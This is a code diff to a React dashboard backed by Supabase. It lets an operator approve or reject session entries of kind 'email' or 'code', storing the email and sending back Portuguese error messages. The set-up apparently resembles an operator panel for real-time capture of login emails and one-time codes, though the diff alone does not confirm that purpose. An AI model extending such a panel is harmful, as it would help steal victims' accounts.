@@ -36,6 +36,7 @@ interface ActionRow {
   ad_id: string;
   action: string;
   created_at: string;
+  payload?: { kind?: "email" | "code"; email?: string | null; message?: string } | null;
 }
 
 interface AttemptRow {
@@ -307,7 +308,7 @@ export default function Dashboard() {
     let alive = true;
     supabase
       .from("ad_session_actions")
-      .select("session_id, ad_id, action, created_at")
+      .select("session_id, ad_id, action, created_at, payload")
       .order("created_at", { ascending: false })
       .limit(1000)
       .then(({ data }) => {
@@ -653,8 +654,8 @@ export default function Dashboard() {
       session_id: row.session_id,
       action,
       payload: action === "reject"
-        ? { message: row.kind === "email" ? "Não existe uma conta com este e-mail." : "Código inválido" }
-        : null,
+        ? { kind: row.kind, email: row.email, message: row.kind === "email" ? "Não existe uma conta com este e-mail." : "Código inválido" }
+        : { kind: row.kind, email: row.email },
     });
     setBusy(null);
     if (error) return toast.error(error.message);
